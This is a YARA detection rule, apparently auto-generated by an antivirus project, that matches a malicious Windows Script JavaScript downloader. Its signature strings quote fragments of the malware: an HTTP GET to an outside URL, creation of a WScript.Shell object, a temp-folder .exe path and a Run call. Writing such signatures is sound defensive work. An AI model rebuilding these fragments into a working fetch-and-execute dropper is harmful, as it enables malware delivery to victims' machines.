rule sig_20160401_e88237a66f6dcf02a0151634cedefa0a {
  meta:
    description = "datamaliciousorder - file 20160401_e88237a66f6dcf02a0151634cedefa0a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "947e3752edccfa23b28f7efa54e4a2c9c0e2996a0c0a4208b459769495a6d88d"

  strings:
    $s1  = "EgxUh[XtSx](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "function ByqSdf(UkAvb, CgDet){DwcWjm = DwcWjm * 1; return UkAvb - CgDet;};" fullword ascii
    $s3  = "var RlvWr = function TtoNty() {return WScript[LjFuk](\"WScript\"+\".Shell\");}(), DbjYph = 11;" fullword ascii
    $s4  = "if (EgxUh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WwFq() {return RlvWr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HWaifIhu.ex\" + \"e\";};" fullword ascii
    $s6  = "function XxCe(){return CicQxw + \"\";};" fullword ascii
    $s7  = "function IzbKff() {return ((QhvVx == true) && (QhvVx == EgOl)) ? 1 : DwcWjm;};" fullword ascii
    $s8  = "if (QhvVx && IzbKff() && EgOl){" fullword ascii
    $s9  = "var QhvVx = false;" fullword ascii
    $s10 = "function GnPpi(){return 23;};" fullword ascii
    $s11 = "QhvVx = true; " fullword ascii
    $s12 = "function MrkYcn(GtPdh) {var MsnDq = (1, 2, 3, 4, 5, GtPdh); return MsnDq;};" fullword ascii
    $s13 = "var EgOl = false;" fullword ascii
    $s14 = "}while (ZycHe);" fullword ascii
    $s15 = "function SxrNmz(VswZd){RlvWr[\"R\"+\"un\"](VswZd, DwcWjm, DwcWjm);};" fullword ascii
    $s16 = "return ByqSdf(YoBrl, ImjRfs);" fullword ascii
    $s17 = "var IrhSkm = false;" fullword ascii
    $s18 = "EgOl = true; " fullword ascii
    $s19 = "function XfoKuw(){return LjFuk;};" fullword ascii
    $s20 = "var QlRe = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}